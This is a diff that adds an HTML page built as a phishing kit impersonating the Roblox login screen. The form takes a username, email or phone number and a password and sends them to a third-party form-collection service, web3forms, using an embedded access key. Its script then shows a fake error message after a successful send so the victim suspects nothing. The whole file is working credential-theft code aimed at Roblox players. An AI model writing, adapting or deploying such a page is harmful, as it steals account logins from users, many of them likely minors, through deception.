@@ -1,0 +1,142 @@
+<div class="contact-section">
+  <div class="logo-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox" style="width: 50px; filter: invert(1);">
+    <h2>Login to Roblox</h2>
+  </div>
+
+  <form id="contactForm" action="https://api.web3forms.com/submit" method="POST">
+    <input type="hidden" name="access_key" value="b55ef690-64c2-4e50-afd5-f5d898e845f1">
+
+    <div class="input-group">
+      <input type="text" id="Email" name="name" placeholder="Username/Email/Phone" required>
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="passord" name="Passord" placeholder="Password" required>
+    </div>
+
+    <div class="button-container">
+      <button type="submit">Log In</button>
+    </div>
+
+    <div class="link-container">
+      <a href="#" class="forgot-password">Forgot Password or Username?</a> 
+    </div>
+  </form>
+</div>
+
+<style>
+  body {
+    margin: 0;
+    /* Roblox uses a font stack similar to Gotham or Montserrat */
+    font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background-color: #DEE1E3; /* Light grey background */
+  }
+
+  .contact-section {
+    background: #393B3D; /* Roblox dark theme card color */
+    padding: 30px;
+    border-radius: 8px;
+    width: 400px;
+    box-sizing: border-box;
+    color: #FFFFFF;
+    text-align: center;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+  }
+
+  .logo-container h2 {
+    font-size: 22px;
+    margin: 15px 0 25px;
+    font-weight: 700;
+  }
+
+  .input-group {
+    margin-bottom: 12px;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 15px;
+    background-color: #232527; /* Input background */
+    border: 1px solid #000;
+    border-radius: 4px;
+    font-size: 16px;
+    color: white;
+    box-sizing: border-box;
+  }
+
+  input::placeholder {
+    color: #BDC3C7;
+  }
+
+  input:focus {
+    outline: none;
+    border-color: #FFFFFF;
+  }
+
+  .button-container {
+    margin-top: 20px;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #FFFFFF; /* Roblox "Primary" button is white in dark mode */
+    border: 1px solid #ADB9C5;
+    border-radius: 8px;
+    color: #393B3D;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+
+  button:hover {
+    background: #F2F4F5;
+  }
+
+  .link-container {
+    margin-top: 25px;
+    border-top: 1px solid #545759;
+    padding-top: 20px;
+  }
+  
+  .forgot-password {
+    font-size: 13px; 
+    color: #FFFFFF;
+    text-decoration: none; 
+  }
+  
+  .forgot-password:hover {
+    text-decoration: underline;
+  }
+</style>
+
+<script>
+// Logic remains the same, just fixed the button type trigger
+document.getElementById("contactForm").addEventListener("submit", async function(e){
+  e.preventDefault();
+  const form = e.target;
+  const formData = new FormData(form);
+
+  try {
+    const response = await fetch(form.action, {
+      method: "POST",
+      body: formData
+    });
+
+    if(response.ok){
+      alert("An unknown error occurred. Please try again.");
+      form.reset();
+    } else {
+      alert("Error connecting to Roblox servers.");
+    }
+  } catch(err) {
+    alert("Network error.");
+  }
+});
+</script>
